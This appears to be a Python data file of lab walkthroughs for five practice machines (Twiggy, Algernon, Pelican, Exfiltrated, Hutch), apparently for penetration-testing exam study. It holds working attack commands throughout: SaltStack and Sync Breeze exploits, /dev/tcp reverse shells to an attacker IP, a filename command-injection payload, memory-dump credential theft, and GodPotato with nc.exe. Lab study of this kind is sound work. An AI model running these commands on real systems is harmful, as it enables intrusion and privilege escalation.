# Twiggy, Algernon, Pelican, Exfiltrated, Hutch. Loaded by build_guides.py.
# Each "If this doesn't match" tip names the route most public write-ups show,
# for when the box doesn't behave the way the notes describe.
# Uses the P, C, O, L, W, F helpers from build_guides.py, which runs this file.

twiggy = {
  'title': 'Linux · SaltStack → direct root',
  'ips': {'K': '192.168.45.180', 'T': '192.168.153.60'},
  'steps': [
    {'h': 'Recon', 'b': [
      P('salt-master runs as root, so RCE here **is** root.'),
      C('sudo nmap -p- --min-rate 5000 -Pn {T} -oN twiggy_ports.txt\nsudo nmap -sC -sV -p 22,53,80,4505,4506,8000 -Pn {T} -oN twiggy_svc.txt'),
      O('4505/tcp open  zmtp   ZeroMQ ZMTP 2.0\n4506/tcp open  zmtp   ZeroMQ ZMTP 2.0\n8000/tcp open  http   SaltStack rest_cherrypy'),
      P('🎯 Ports **4505/4506** are a SaltStack master. Port 8000 leaks version **3000**.')]},
    {'h': 'Vuln: CVE-2020-11651 (auth bypass) + CVE-2020-11652 (traversal)', 'b': [
      C('searchsploit saltstack\nsearchsploit -m 48421     # or your offline jasperla PoC')]},
    {'h': 'Confirm RCE', 'b': [
      C("python3 exploit.py --master {T} --exec 'id'"),
      O('uid=0(root) gid=0(root)'),
      P('✅ Running as root.')]},
    {'h': 'Reverse shell as root', 'b': [
      C('rlwrap nc -lvnp 80'),
      C('python3 exploit.py --master {T} --exec \'bash -c "bash -i >& /dev/tcp/{K}/80 0>&1"\''),
      W('Egress is filtered: call back on port **80**.'),
      C('cat /root/proof.txt'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '📡 ZeroMQ on **4505/4506** means SaltStack.',
    '📦 Keep PoCs **offline**: there\'s no internet in the exam.',
    '✅ Confirm with `id` before you try for a shell.'],
}

algernon = {
  'title': 'Windows · Sync Breeze BOF → SYSTEM',
  'ips': {'K': '192.168.45.180', 'T': '192.168.153.62'},
  'steps': [
    {'h': 'Recon', 'b': [
      P('The overflow lands you straight as SYSTEM.'),
      C('sudo nmap -sC -sV -p 21,80,9121 -Pn {T}'),
      O('80/tcp   open  http  Sync Breeze Enterprise\n9121/tcp open  http  Sync Breeze Enterprise'),
      P('🎯 The login page footer shows **Sync Breeze Enterprise 10.0.28**.'),
      W('**If this doesn\'t match:** most write-ups of PG Algernon show **SmarterMail**, not Sync Breeze: anonymous FTP, the SmarterMail web UI on port **9998**, and .NET remoting on **17001**. The usual exploit is `searchsploit -m 49216` (SmarterMail build 6985 RCE), which gives SYSTEM. Run a full `-p-` scan first and follow whichever service you actually see.')]},
    {'h': 'Exploit', 'b': [
      C('searchsploit sync breeze\nsearchsploit -m 42341')]},
    {'h': 'Fresh shellcode (bad chars)', 'b': [
      C('msfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=443 -b "\\x00\\x0a\\x0d\\x25\\x26" -f python -v shellcode EXITFUNC=thread'),
      P('Paste it into `42341.py`, and set `ip = "{T}"` and port 80.')]},
    {'h': 'Run', 'b': [
      C('rlwrap nc -lvnp 443\npython2 42341.py'),
      O('nt authority\\system'),
      W('Egress is filtered: call back on port **443**. The script is **python2**.'),
      C('type C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🔍 Fingerprint the **exact version** before picking an exploit.',
    '🧬 Always **regenerate the shellcode**.',
    '🚫 HTTP overflows kill `\\x00 \\x0a \\x0d % &`.'],
}

pelican = {
  'title': 'Linux · Exhibitor RCE → gcore → root',
  'ips': {'K': '192.168.45.180', 'T': '192.168.153.64'},
  'steps': [
    {'h': 'Recon', 'b': [
      C('sudo nmap -sC -sV -p 22,80,2181,8080,8181 -Pn {T}'),
      O('2181/tcp open  zookeeper 3.4.6\n8080/tcp open  http      Exhibitor Web UI'),
      P('🎯 **Exhibitor** on 8080 lets you edit the `java.env` startup script, which is command injection.')]},
    {'h': 'Foothold: inject into the config', 'b': [
      P('Open `http://{T}:8080/exhibitor/v1/ui/index.html`, go to the **Config** tab, turn **Editing ON**, and put this in the **java.env script** field:'),
      C('$(bash -i >& /dev/tcp/{K}/80 0>&1)'),
      C('rlwrap nc -lvnp 80'),
      O('uid=1000(charles)'),
      W('Egress is filtered: call back on port **80**.'),
      C('cat /home/charles/local.txt'),
      F('local.txt captured')]},
    {'h': 'Privesc enumeration', 'b': [
      C('find / -perm -u=s -type f 2>/dev/null'),
      O('/usr/bin/gcore  <-- SUID, abnormal'),
      W('**If this doesn\'t match:** on most runs gcore isn\'t SUID. Instead `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/gcore` for charles. Then use `sudo gcore <PID>` in the next step.'),
      C('sudo -l')]},
    {'h': 'Root via a memory dump', 'b': [
      C("ps -ef | grep -i -E 'root|screen|backup'    # pick a root PID, e.g. 812\ncd /tmp\ngcore 812\nstrings core.812 | grep -i -E 'pass|pwd|root'"),
      O('... password=<secret> ...'),
      P('Write-ups usually find the secret in a root process called **password-store**. Dump that PID first.'),
      C('su root        # enter the recovered password\ncat /root/proof.txt'),
      W('The exact PID and secret vary: dump each root PID and run `strings` on it.'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🔍 **2181 + 8080** means ZooKeeper with Exhibitor.',
    '💥 A field that becomes a startup script means RCE.',
    '🧪 An odd SUID or sudo binary (`gcore`) is your privesc: check **GTFOBins**.'],
}

exfiltrated = {
  'title': 'Linux · Subrion CMS → root cron',
  'ips': {'K': '192.168.45.180', 'T': '192.168.153.66'},
  'steps': [
    {'h': 'Recon and the vhost', 'b': [
      C('sudo nmap -sC -sV -p 22,80 -Pn {T}'),
      P('It redirects to `exfiltrated.offsec`, so add it to /etc/hosts:'),
      C("echo '{T} exfiltrated.offsec' | sudo tee -a /etc/hosts")]},
    {'h': 'Subrion admin → upload a shell', 'b': [
      P('The panel is at `/panel/`. Log in with **admin:admin**. Version **4.2.1** has CVE-2018-19422: `.php` is blocked, so use **.phar**.'),
      C('cp /usr/share/webshells/php/php-reverse-shell.php shell.phar   # set ip={K} port=80'),
      P('Upload it in **Panel → Uploads**, then:'),
      C('rlwrap nc -lvnp 80\ncurl http://exfiltrated.offsec/uploads/shell.phar'),
      O('uid=33(www-data)'),
      W('Egress is filtered: call back on port **80**.'),
      F('local.txt captured')]},
    {'h': 'Privesc: find the root cron', 'b': [
      C('wget http://{K}/pspy64 -O /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy'),
      O('UID=0 ... /opt/image-exif.sh'),
      P('It runs as root on images that get uploaded.')]},
    {'h': 'Root', 'b': [
      P('Your notes: a malicious filename.'),
      C("cd <dir the script watches>\ntouch '$(cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash).jpg'\n# wait for the cron, then:\n/tmp/rootbash -p\ncat /root/proof.txt"),
      W('**If this doesn\'t match:** most write-ups show `/opt/image-exif.sh` running **exiftool** on the images in the Subrion uploads folder. That\'s **CVE-2021-22204** (exiftool before 12.24): a crafted **DjVu** image runs a command as root. Make one with a public CVE-2021-22204 PoC, drop it in the uploads folder, and wait for the cron. Check the script with `cat /opt/image-exif.sh` and the version with `exiftool -ver`.'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🌐 A redirect means adding the name to `/etc/hosts`.',
    '🔑 admin:admin plus an upload CVE; `.phar` gets past a `.php` block.',
    '🕵️ **pspy** finds hidden root crons.',
    '💥 Anything a root script reads from a folder you can write to (a filename, an image) is an injection point.'],
}

hutch = {
  'title': 'Windows AD · LDAP password → WinRM → SYSTEM',
  'ips': {'K': '192.168.45.180', 'T': '192.168.153.122'},
  'steps': [
    {'h': 'Recon', 'b': [
      P('The domain is **hutch.offsec**.'),
      C('sudo nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,5985,9389 -Pn {T}'),
      P('🎯 It\'s a Domain Controller with **WinRM (5985)** open.')]},
    {'h': 'Anonymous LDAP', 'b': [
      C('ldapsearch -x -H ldap://{T} -b "DC=hutch,DC=offsec" "(objectClass=user)" | grep -i -E "description|info|sAMAccountName"'),
      O('sAMAccountName: fmcsorley\ndescription: CrabSharkJellyfish192'),
      P('🔑 The password is in the **description** field.')]},
    {'h': 'Validate the creds and get a shell', 'b': [
      C("nxc winrm {T} -u fmcsorley -p 'CrabSharkJellyfish192'      # Pwn3d!\nevil-winrm -i {T} -u fmcsorley -p 'CrabSharkJellyfish192'"),
      C('type ..\\Desktop\\local.txt', 'cmd'),
      F('local.txt captured')]},
    {'h': 'Privesc to SYSTEM', 'b': [
      C('whoami /priv', 'cmd'),
      O('SeImpersonatePrivilege Enabled'),
      P('On Kali, host GodPotato and nc.exe:'),
      C('python3 -m http.server 80'),
      P('In evil-winrm:'),
      C('iwr http://{K}/GodPotato-NET4.exe -o C:\\Windows\\Temp\\gp.exe\niwr http://{K}/nc.exe -o C:\\Windows\\Temp\\nc.exe\nC:\\Windows\\Temp\\gp.exe -cmd "C:\\Windows\\Temp\\nc.exe {K} 443 -e cmd.exe"', 'powershell'),
      C('rlwrap nc -lvnp 443'),
      O('nt authority\\system'),
      W('Egress is filtered: serve on **80**, catch on **443**.'),
      C('type C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
      F('proof.txt captured 👑')]},
  ],
  'backup': {'h': 'If this doesn\'t match: read the LAPS password', 'b': [
    P('Most write-ups of Hutch don\'t show SeImpersonate for fmcsorley. The usual route: **LAPS** is set up and fmcsorley can read the Administrator password.'),
    C("ldapsearch -x -H ldap://{T} -D 'hutch\\fmcsorley' -w 'CrabSharkJellyfish192' -b 'DC=hutch,DC=offsec' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd"),
    O('ms-Mcs-AdmPwd: <the Administrator password>'),
    C("evil-winrm -i {T} -u administrator -p '<password from above>'")]},
  'takeaways': [
    '🏢 On a DC, try an **anonymous LDAP bind** and read `description` and `info`.',
    '✅ Validate creds with `nxc` before anything else.',
    '🎟️ `whoami /priv` showing SeImpersonate means GodPotato or PrintSpoofer.',
    '🔐 A domain user with LAPS read rights means the local admin password.',
    '📦 Keep those binaries **offline**.'],
}

BATCH2 = {'pgp-twiggy': twiggy, 'pgp-algernon': algernon, 'pgp-pelican': pelican, 'pgp-exfiltrated': exfiltrated, 'pgp-hutch': hutch}
